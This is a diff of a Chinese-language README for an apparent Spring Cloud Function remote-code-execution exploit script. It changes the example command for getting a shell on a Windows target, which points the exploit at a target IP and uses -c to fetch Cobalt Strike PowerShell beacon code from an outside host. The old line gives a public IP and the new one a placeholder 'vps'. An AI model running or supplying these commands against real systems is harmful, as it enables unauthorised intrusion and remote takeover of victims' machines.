@@ -51,9 +51,9 @@ pip3 install -r requirements.txt
 
 ### 3.4 windows靶机getshell
 
-`python3 spring-cloud-function-rce.py -u "http://192.168.50.222:8080/" -e -s "win" -c "http://1.117.155.217/21918"`
+`python3 spring-cloud-function-rce.py -u "http://192.168.50.222:8080/" -e -s "win" -c "http://vps/a"`
 
-> -c指定cs生成powershell上线代码的地址，必须配合 -s "win"使用
+> -c指定cs生成powershell上线代码的地址，必须配合 -s "win"使用,-c 选项必须在windows下执行脚本，脚本会调用powershell进行poc编码
 
 ![image-20220414185711222](README.assets/image-20220414185711222.png)
 
